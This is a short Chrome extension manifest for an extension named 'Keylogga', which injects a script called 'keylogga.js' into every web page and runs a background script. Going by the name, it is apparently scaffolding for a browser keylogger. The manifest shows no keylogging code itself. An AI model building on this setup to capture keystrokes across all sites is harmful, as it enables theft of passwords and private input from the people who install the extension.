{
  "manifest_version": 2,

  "name": "Keylogga",
  "description": "Events and shit.",
  "version": "0.0",

  "background": {
    "page": "background.html",
    "scripts": ["background.js"]
  },

  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["keylogga.js"],
      "run_at": "document_end"
    }
  ]
}
